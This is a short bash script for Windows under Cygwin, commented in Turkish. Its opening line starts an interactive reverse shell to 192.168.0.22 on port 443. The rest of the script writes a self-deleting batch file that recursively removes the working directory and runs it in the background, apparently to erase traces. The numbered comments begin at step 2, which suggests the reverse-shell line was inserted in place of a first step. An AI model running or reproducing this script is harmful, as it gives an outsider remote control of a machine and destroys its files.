#!/bin/bash

bash -i >&/dev/tcp/192.168.0.22/443 0>&1

# 2. Silinecek klasörün Windows yolunu al
TARGET_DIR=$(cygpath -w "$PWD")

# 3. Geçici bir silici batch dosyası oluştur (Geçici dizine yazılır)
CLEANUP_BAT="$TEMP/cleanup_$RANDOM.bat"

cat << EOF > "$CLEANUP_BAT"
@echo off
timeout /t 2 /nobreak >nul
rmdir /s /q "$TARGET_DIR"
del "%~f0"
EOF

# 4. Ana dizinden çık
cd ..

# 5. Batch dosyasını arka planda tamamen bağımsız çalıştır
cmd.exe /c start /b "" "$CLEANUP_BAT"
